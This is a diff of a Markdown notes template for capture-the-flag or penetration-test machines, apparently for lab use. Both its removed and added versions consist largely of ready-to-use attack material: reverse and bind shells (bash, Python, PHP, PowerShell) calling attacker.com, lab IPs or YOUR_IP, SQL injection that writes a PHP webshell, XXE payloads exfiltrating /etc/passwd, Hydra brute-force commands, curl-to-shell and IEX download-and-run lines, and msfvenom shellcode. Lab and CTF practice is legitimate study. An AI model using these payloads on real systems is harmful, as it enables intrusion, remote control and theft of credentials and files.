@@ -1,224 +1,403 @@
 # Notes: {{.Name}}
 
-## RECON
+## INITIAL RECON 📝
 
-* set `/etc/hosts` for {{.IPAddress}} if you see a domain.
-* enumerate subdomains `dig axfr <domain> @{{.IPAddress}}`
+* Target IP: {{.IPAddress}}
+* Domain mappings: `echo "{{.IPAddress}} targetdomain.com" >> /etc/hosts`
+* Subdomain enumeration: `dig axfr <domain> @{{.IPAddress}}`
 
-### NMAP
+### Web Checks ✅
 
-_note: zsh needs quotations around wildcard `*`._
+- [ ] HTTP response headers: `curl -I http://{{.IPAddress}}`
+- [ ] Directory listing?
+- [ ] Default/Debug pages?
+- [ ] robots.txt and sitemap.xml
+- [ ] Identify web technologies: `whatweb http://{{.IPAddress}}`
+- [ ] Default credentials on identified services
+- [ ] Page source: comments, hidden fields, JS files
+- [ ] Exposed .git directories: `http://{{.IPAddress}}/.git/`
+- [ ] SSL/TLS configuration: `nmap --script ssl-enum-ciphers -p 443 {{.IPAddress}}`
+- [ ] Take screenshots: `gowitness single http://{{.IPAddress}}`
 
-scan ports ALL:
+**Findings:**
+```
+# Add interesting findings here
 
-`nmap -v -Pn -p- --min-rate=5000 -oN nmap-{{.Name}}.txt {{.IPAddress}}`
 
-scan version, OS:
-
-`nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -oN nmap-version-{{.Name}}.txt {{.IPAddress}}`
-
-vuln scan ALL:
-
-`nmap -v -Pn -p- -sV --script "vuln*" -oN nmap-vuln-{{.Name}}.txt {{.IPAddress}}`
-
-#### SAMBA 
-
-samba enum, vuln:
-
-`nmap -v -Pn -p 139,445 --script smb-enum-shares {{.IPAddress}} -oN nmap-smb-shares-{{.Name}}.txt`
-
-`nmap -v -Pn -p 139,445 --script "smb-vuln*" {{.IPAddress}} -oN nmap-smb-vuln-{{.Name}}.txt`
-
-* list `smbclient -L //{{.IPAddress}}`
-* login `smbclient //{{.IPAddress}}/<DIR>`
-
-### GOBUSTER / FEROXBUSTER
-
-general enumeration:
-
-`gobuster dir -e -u http://{{.IPAddress}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-{{.Name}}.txt`
-
-add `-k` for `https`
-
-extension scan:
-
-`gobuster dir -x cgi,php,sh,log, -u http://{{.IPAddress}}/cgi-bin/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-extensions.txt`
-
-Wordlists:
-
-* [ ] `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
-* [ ] `/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-*`
-
-## CRACKING
-
-### Hydra
-
-Format:
-
-* `-l` login, `-L` wordlist for logins
-* `-p` password, `-P` wordlist for passwords
-* `-V`
-* `http-post-form` or `https-post-form`
-* `"login form":"POST form":"Failed Message"` see example below
-
-```bash
-hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt 10.10.10.60 -V https-post-form '/index.php:__csrf_magic=sid%3Ad09980e510f7e924131941c772682ffbc566d7b3%2C1650961765&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect'
 ```
 
-## REVERSE SHELLS
+### Port Scanning 🔍
 
-### bash
-
+**Quick Scan:**
 ```bash
-export RHOST=attacker.com
-export RPORT=443
-bash -c 'exec bash -i &>/dev/tcp/$RHOST/$RPORT <&1'
+nmap -v -Pn -p- --min-rate=5000 -oN nmap-{{.Name}}.txt {{.IPAddress}}
 ```
 
-listener: `sudo rlwrap nc -nlvp 443`
-
-### bind shell
-
-traditional nc only (i.e. with `-e` option):
-
+**Detailed Scan:**
 ```bash
-# on target machine
-LPORT=12345
-nc -l -p $LPORT -e /bin/sh 
+nmap -v -Pn -p- -sC -sV -O --min-rate=5000 -oN nmap-version-{{.Name}}.txt {{.IPAddress}}
 ```
 
-### python
-
+**Vulnerability Scan:**
 ```bash
-export RHOST=attacker.com
-export RPORT=12345
-python -c 'import sys,socket,os,pty;s=socket.socket()
-s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))
-[os.dup2(s.fileno(),fd) for fd in (0,1,2)]
-pty.spawn("/bin/sh")'
+nmap -v -Pn -p- -sV --script "vuln*" -oN nmap-vuln-{{.Name}}.txt {{.IPAddress}}
 ```
 
-listener: `socat file:`tty`,raw,echo=0 tcp-listen:12345`
+**Key Ports to Check:**
+- Web: 80, 443, 8080, 8443
+- SSH: 22
+- FTP: 21
+- Database: 3306 (MySQL), 5432 (PostgreSQL), 1433 (MSSQL), 1521 (Oracle), 6379 (Redis), 27017 (MongoDB)
+- LDAP: 389, 636 (LDAPS)
+- RPC/WinRM: 135, 593, 5985, 5986
+- DNS: 53 (TCP/UDP)
+- SNMP: 161 (UDP)
 
-if you get root to run this, you get a root shell:
+**Open Ports:**
+```
+# Document discovered ports and services here
 
+
+```
+
+### SMB Enumeration 🖥️
+
+```bash
+nmap -v -Pn -p 139,445 --script smb-enum-shares {{.IPAddress}} -oN nmap-smb-shares-{{.Name}}.txt
+nmap -v -Pn -p 139,445 --script "smb-vuln*" {{.IPAddress}} -oN nmap-smb-vuln-{{.Name}}.txt
+```
+
+- List shares: `smbclient -L //{{.IPAddress}}`
+- Connect to share: `smbclient //{{.IPAddress}}/<DIR>`
+- Null authentication: `smbclient -N //{{.IPAddress}}/<DIR>`
+- Recursively download: `smbget -R smb://{{.IPAddress}}/<DIR>`
+
+**Findings:**
+```
+# Document SMB enumeration results here
+
+
+```
+
+## DIRECTORY ENUMERATION 🔎
+
+### Web Directory Discovery
+
+**General scan:**
+```bash
+gobuster dir -e -u http://{{.IPAddress}} -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o gobuster-{{.Name}}.txt
+```
+
+**With file extensions:**
+```bash
+gobuster dir -x cgi,php,sh,pl,asp,aspx,txt,log,bak -u http://{{.IPAddress}} -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt
+```
+
+**Useful wordlists:**
+- `/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`
+- `/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-directories.txt`
+- `/usr/share/wordlists/SecLists/Discovery/Web-Content/raft-medium-files.txt`
+- `/usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt`
+
+**Interesting Findings:**
+```
+# Document discovered directories/files here
+
+
+```
+
+## EXPLOITATION TECHNIQUES 💥
+
+### File Upload Bypasses
+
+- Change Content-Type in request: `Content-Type: image/jpeg`
+- Add image magic bytes: `GIF89a;` before PHP code
+- Try double extensions: `.php.jpg`
+- Try alternate extensions: `.phtml`, `.php5`, `.phps`, `.pHp`
+- Try uppercase/lowercase: `.pHP`
+- Try null byte (older PHP): `file.php%00.jpg`
+- Try shell inside metadata: `exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg`
+
+**Notes on Upload Bypass Attempts:**
+```
+# Document your upload bypass attempts here
+
+
+```
+
+### Code Injection Payloads
+
+#### SQL Injection
+- Authentication bypass: `' OR 1=1 --`
+- Union select: `' UNION SELECT 1,2,3,4,5 --`
+- Database enum: `' UNION SELECT 1,database(),user(),version(),5 --`
+- Read files: `' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3,4,5 --`
+- Write files: `' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3,4 INTO OUTFILE '/var/www/html/shell.php' --`
+
+#### Command Injection
+- Basic test: `; id`
+- Bypass spaces: `${IFS}`
+- Bypass blacklisting: ``` `id` ``` or `$(id)` or `$((id))`
+- Reverse shells: `; bash -c 'bash -i >& /dev/tcp/{{.IPAddress}}/4444 0>&1'`
+
+**Injection Attempts and Results:**
+```
+# Document your injection attempts here
+
+
+```
+
+### JWT Testing
+
+- Decode JWT: `echo "<token>" | cut -d "." -f 1,2 | tr "." "\n" | base64 -d`
+- Test for alg:none vulnerability
+- Test for weak secrets (hashcat/john)
+- JWT toolkit: `jwt_tool.py <token> -M pb`
+- Check kid parameter for command injection
+
+**JWT Analysis:**
+```
+# Document JWT testing here
+
+
+```
+
+### SSRF Payloads
+
+- Basic internal scanning: `http://localhost:port/`
+- Common internal services: `http://127.0.0.1:22/`, `http://127.0.0.1:3306/`
+- AWS metadata: `http://169.254.169.254/latest/meta-data/`
+- File protocol: `file:///etc/passwd`
+- Blind SSRF with DNS: `http://internal-service.burpcollaborator.net/`
+
+### XXE Payloads
+
+Basic test: 
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]>
+<root>&test;</root>
+```
+
+OOB XXE:
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE data [
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % dtd SYSTEM "http://{{.IPAddress}}/evil.dtd">
+%dtd;]>
+<data>&send;</data>
+```
+
+Evil DTD (save as evil.dtd):
+```xml
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://{{.IPAddress}}/?data=%file;'>">
+%all;
+```
+
+**SSRF/XXE Attempts:**
+```
+# Document SSRF/XXE testing here
+
+
+```
+
+## CREDENTIAL ATTACKS 🔑
+
+### Brute Force with Hydra
+
+**Format:**
+- `-l` login, `-L` wordlist for logins
+- `-p` password, `-P` wordlist for passwords
+- `-V` verbose output
+- `http-post-form` or `https-post-form`
+- Format: `"login path":"POST data":"Failed Message"`
+
+**Web Form Example:**
+```bash
+hydra -l admin -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt {{.IPAddress}} -V https-post-form '/index.php:__csrf_magic=sid%3Ad09980e510f7e924131941c772682ffbc566d7b3%2C1650961765&usernamefld=^USER^&passwordfld=^PASS^&login=Login:Username or Password incorrect'
+```
+
+**SSH Example:**
+```bash
+hydra -l user -P /usr/share/wordlists/rockyou.txt {{.IPAddress}} -t 4 ssh
+```
+
+**Password Cracking**
+
+- MD5: `hashcat -m 0 hash.txt wordlist.txt`
+- SHA1: `hashcat -m 100 hash.txt wordlist.txt`
+- SHA256: `hashcat -m 1400 hash.txt wordlist.txt`
+- SHA512: `hashcat -m 1700 hash.txt wordlist.txt`
+- NTLM: `hashcat -m 1000 hash.txt wordlist.txt`
+- NetNTLMv2: `hashcat -m 5600 hash.txt wordlist.txt`
+- Linux shadow: `hashcat -m 1800 hash.txt wordlist.txt`
+
+**Common wordlists:** 
+- `/usr/share/wordlists/rockyou.txt`
+- `/usr/share/wordlists/SecLists/Passwords/Leaked-Databases/`
+
+**Cracking Attempts:**
+```
+# Document your password cracking attempts here
+
+
+```
+
+## REVERSE SHELLS 🔄
+
+### Common Reverse Shells
+
+**Bash:**
+```bash
+bash -c 'bash -i >& /dev/tcp/YOUR_IP/PORT 0>&1'
+```
+
+**Python:**
 ```python
-#!/usr/bin/python
-
-import socket
-import subprocess
-import os
-
-s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-s.connect(("10.10.14.5",443))
-os.dup2(s.fileno(),0)
-os.dup2(s.fileno(),1)
-os.dup2(s.fileno(),2)
-p=subprocess.call(["/bin/sh","-i"]);
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("YOUR_IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"]);'
 ```
 
-short python:
-
-```python
-import os
-os.system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4444 >/tmp/f')
-```
-
-PHP
-
+**PHP:**
 ```php
-<?php
-system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f');
-?>
+php -r '$sock=fsockopen("YOUR_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
-### Upgrade your shell
+**PowerShell:**
+```powershell
+powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('YOUR_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+```
 
-Python:
-
+**Reverse Shell Listener:**
 ```bash
-which python 
+nc -lvnp PORT   # Basic listener
+socat file:`tty`,raw,echo=0 tcp-listen:PORT   # Fully interactive 
+rlwrap nc -lvnp PORT   # History support
+```
+
+### Shell Stabilization
+
+**Python TTY:**
+```bash
 python -c 'import pty; pty.spawn("/bin/bash")'
 ```
 
-Bash:
-
+**Full TTY Upgrade:**
 ```bash
-SHELL=/bin/bash script -q /dev/null
+# In reverse shell
+python -c 'import pty; pty.spawn("/bin/bash")'
+Ctrl+Z (background process)
+
+# In local terminal
+stty raw -echo
+fg
+reset
+
+# In reverse shell
+export TERM=xterm
+stty rows 38 columns 116
 ```
 
-STTY:
+**Shell Stabilization Notes:**
+```
+# Document your shell techniques and outcomes here
 
-1. `ctrl-z` to background your reverse shell
-2. attack machine: `stty raw -echo` to send control characters through the reverse shell
-3. attack machine: `stty size` and take note of rows & cols
-4. `fg` to foreground your reverse shell again
 
-finally, on target:
-
-```bash
-export SHELL=bash
-stty rows $x columns $y #Set remote shell to x number of rows & y columns
-export TERM=xterm-256color #allows you to clear console, and have color output
 ```
 
-## ENUMERATE LINUX
+## PRIVILEGE ESCALATION 🚀
 
-* [ ] `sudo -l`
-* [ ] `find / -user $username` - find everything this user owns.
-* [ ] `find / -perm /4000 2>/dev/null` find suids
-* [ ] credentail re-use -- logins? SSH? re-try existing creds against all logins.
+### Linux Enumeration
 
+- [ ] `sudo -l` - Check sudo permissions
+- [ ] `find / -perm /4000 2>/dev/null` - Find SUID binaries
+- [ ] `find / -user root -perm -4000 -exec ls -ld {} \;` - Find root SUID binaries
+- [ ] `find / -writable -type d 2>/dev/null` - Find writable directories
+- [ ] `find / -perm -222 -type d 2>/dev/null` - Find world-writable directories
+- [ ] `getcap -r / 2>/dev/null` - List capabilities
+- [ ] `cat /etc/crontab` - Check scheduled tasks
+- [ ] `ps aux | grep -i root` - Check running processes as root
+- [ ] Credential re-use - Try found credentials on all accounts
 
-Other finds:
-
+**Quick Linux Enumeration Scripts:**
 ```bash
-find / -type d \( -perm -g+w -or -perm -o+w \) -exec ls -adl {} \;
-find / -writable -type d 2>/dev/null
-find / -perm -222 -type d 2>/dev/null
-find / -perm -o w -type d 2>/dev/null 
-find / -perm -o x -type d 2>/dev/null 
-find / \( -perm -o w -perm -o x \) -type d 2>/dev/null
+curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
+python -c "import urllib.request; urllib.request.urlretrieve('https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64', 'pspy64'); import os; os.chmod('pspy64', 0o755)"
 ```
 
-## PRIVESC
+### Windows Enumeration
 
-### SUID & SUDO
+- [ ] Run PowerUp.ps1: `. .\PowerUp.ps1; Invoke-AllChecks`
+- [ ] Run WinPEAS: `.\winPEAS.exe`
+- [ ] Check service permissions: `.\accesschk.exe -uwcqv "Authenticated Users" *`
+- [ ] Check for weak service permissions: `Get-Acl -Path "HKLM:\System\CurrentControlSet\Services\*" | Format-List`
+- [ ] Check AlwaysInstallElevated: `reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated`
+- [ ] Check for stored credentials: `cmdkey /list`
+- [ ] Search for passwords: `findstr /si password *.txt *.ini *.config *.xml`
+- [ ] Check for unquoted service paths: `wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\" | findstr /i /v """`
 
-* [ ] if suid file run `less`, `man`, type `!/bin/sh` inside + enter
-
-bash:
-
-```bash
-# suid: get suid bin to run this
-./bash -p
-# sudo: 
-sudo bash
+**Quick Windows Enumeration:**
+```powershell
+IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1'); Invoke-AllChecks
 ```
 
-python:
+### Buffer Overflow Methodology
 
-```bash
-# suid: get the suid bin to run this 
-./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+1. Crash the program: `python -c "print('A' * 1000)" | ./program`
+2. Find the EIP offset: `pattern_create.rb -l 1000` and `pattern_offset.rb -q <EIP value>`
+3. Verify control of EIP: `python -c "print('A' * <offset> + 'B' * 4 + 'C' * 100)" | ./program`
+4. Find bad characters: Create bad char array and check memory after crash
+5. Find JMP ESP address: `objdump -d ./program | grep -i "jmp esp"`
+6. Generate shellcode: `msfvenom -p linux/x86/shell_reverse_tcp LHOST={{.IPAddress}} LPORT=4444 -b '\x00' -f python`
+7. Final exploit structure:
+   - Buffer to EIP offset
+   - JMP ESP address (in little endian)
+   - NOP sled (\x90)
+   - Shellcode
 
-# sudo: spawn /bin/sh
-sudo python -c 'import os; os.system("/bin/sh")'
+### Container/Docker Escape
+
+- Check if inside container: `cat /proc/1/cgroup | grep -i docker`
+- Check for mounted docker socket: `ls -la /var/run/docker.sock`
+- Check for privileged mode: `cat /proc/self/status | grep CapEff`
+- Check mounted sensitive directories: `mount | grep -i '/host'`
+- Escape with privileged mode: `breakout.sh` or mount host filesystem
+
+**Privilege Escalation Notes:**
+```
+# Document your privilege escalation attempts here
+
+
 ```
 
-## FLAGS
+## FLAGS 🚩
 
 ### user.txt
+```
+# Add user flag here
 
-```bash
 
 ```
 
 ### root.txt
+```
+# Add root flag here
 
-```bash
 
 ```
 
-## LESSONS LEARNED
+## LESSONS LEARNED 📚
 
+```
+# Document what you learned from this challenge
+
+
+```
+
+## ATTACK PATH 🗺️
+
+```
+# Document your full attack path here for future reference
+
+
+```
